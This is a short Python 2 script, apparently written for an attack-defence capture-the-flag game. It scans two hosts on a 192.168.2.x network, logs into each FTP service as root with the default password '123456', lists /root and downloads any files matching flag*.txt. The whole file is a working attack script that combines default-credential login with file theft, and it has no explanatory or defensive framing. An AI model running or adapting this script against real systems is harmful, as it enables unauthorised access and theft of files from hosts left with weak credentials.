from ftplib import FTP
import re
ftp = FTP()
for i in range(212,214):
	try:
		ip='192.168.2.'+str(i)
		ftp.connect(ip,21,1)
		ftp.login('root','123456')
		try:
			ftp.cwd('/root')
			flist=ftp.nlst()
			flista=str(flist)
			re=re.findall(r'flag.*txt',flista)
			for j in re:
				try:
					ftp.retrbinary("RETR "+j,open(str(i)+'flag','a+').write,1024) 
					print i,'download ok'           
				except Exception as err:
					print i,err
		except Exception as err:
			print i,err
	except:
		print i,'conn down'

